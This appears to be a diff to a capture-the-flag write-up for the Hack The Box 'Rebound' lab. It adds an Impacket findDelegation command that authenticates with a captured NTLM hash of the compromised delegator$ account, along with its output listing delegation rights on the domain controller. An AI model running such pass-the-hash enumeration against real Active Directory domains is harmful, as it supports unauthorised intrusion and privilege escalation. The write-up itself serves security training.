@@ -441,6 +441,16 @@ SMB         10.129.14.17    445    DC01             [+] rebound.htb\delegator$:a
 This account is compromised
 
 # Domain Admin
+```python
+faketime -f +7h findDelegation.py -k -no-pass rebound.htb/'delegator$'@dc01.rebound.htb -hashes ':aafb74ba2eb5e5ff7003a9a54ad1f904'
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Getting machine hostname
+[-] CCache file is not found. Skipping...
+AccountName  AccountType                          DelegationType                       DelegationRightsTo     SPN Exists 
+-----------  -----------------------------------  -----------------------------------  ---------------------  ----------
+DC01$        Computer                             Unconstrained                        N/A                    Yes        
+delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb  No
+```
 
 
